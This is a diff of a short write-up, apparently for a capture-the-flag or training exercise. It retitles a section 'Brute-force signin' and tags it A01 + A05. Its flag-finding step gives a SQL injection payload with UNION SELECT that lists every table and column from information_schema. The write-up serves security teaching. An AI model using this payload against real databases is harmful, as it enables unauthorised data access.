@@ -1,4 +1,7 @@
-# a01 + a05
+# Brute-force signin
+
+## Breach type:
+A01 + A05
 
 ## How to find the flag:
 * Display all the tables of the databases with : `105 OR 1=1 UNION SELECT table_name, column_name FROM information_schema.columns`
